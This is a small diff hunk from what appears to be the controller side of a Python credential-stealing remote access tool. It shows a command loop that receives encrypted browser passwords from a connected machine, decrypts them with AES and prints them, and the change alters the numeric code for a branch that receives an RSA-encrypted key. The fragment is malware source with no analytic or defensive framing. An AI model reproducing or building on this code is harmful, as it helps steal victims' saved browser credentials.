@@ -488,7 +488,7 @@ while True:
                 browser_password = AES256.decrypt(ebrowser_password, d_key13)
                 print "\n\n" + browser_password
 
-            elif int(float(command)) == 57449330:
+            elif int(float(command)) == -120590662:
                 e_key15 = recv_one_message(conn)
                 print "\nRecieved encrypted key"
                 decryptor15 = PKCS1_OAEP.new(keyPair)
